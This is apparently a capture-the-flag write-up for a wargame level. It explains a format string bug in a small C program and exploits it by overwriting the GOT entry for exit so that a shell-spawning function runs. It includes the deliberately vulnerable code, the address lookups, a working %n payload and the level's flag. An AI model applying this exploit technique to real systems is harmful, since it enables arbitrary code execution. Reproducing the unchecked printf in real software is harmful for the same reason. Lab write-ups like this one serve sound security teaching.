# level5 — format string: overwrite a GOT entry

**Teaches:** redirecting control flow by overwriting the GOT. Re-read primer §6–§7.

## 1–2. Reconstructed C
```c
void o(void) { system("/bin/sh"); _exit(1); }   // present but NEVER called
void n(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);                              // format string bug
    exit(1);                                     // <-- always exits here
}
int main(void) { n(); return 0; }
```

## 3. The vulnerability
Same `printf` write primitive. The twist: there is no `m` check and `n()` never
returns — it calls `exit(1)`. So overwriting a stack return address is useless.
Instead, overwrite the **GOT entry for `exit`** so that when `exit(1)` runs, it
jumps to `o()` and gives a shell.

## 4. Step by step
1. `disassemble n` → `printf(buffer)` then `exit`. `disassemble o` → `system`.
2. Find the addresses:
   ```
   $ objdump -R level5 | grep exit
   08049838 R_386_JUMP_SLOT   exit          # GOT slot to overwrite
   (gdb) info function o                     # 0x080484a4  target
   ```
3. Locate your buffer: `%x` walk → argument **#4** (`61616161`).
4. `o()` = `0x080484a4` = 134513828 decimal. Minus the 4 address bytes already
   printed → pad `%134513824d`.

## 5. Exploit
```
python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/exploit
cat /tmp/exploit - | ./level5
```
**Why it works:** `%n` writes 134513828 = `0x080484a4` (address of `o`) into the
`exit` GOT slot at `0x08049838`. When `n()` then calls `exit(1)`, the PLT reads
the (now poisoned) GOT slot and jumps to `o()` → `system("/bin/sh")`.

Flag → `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
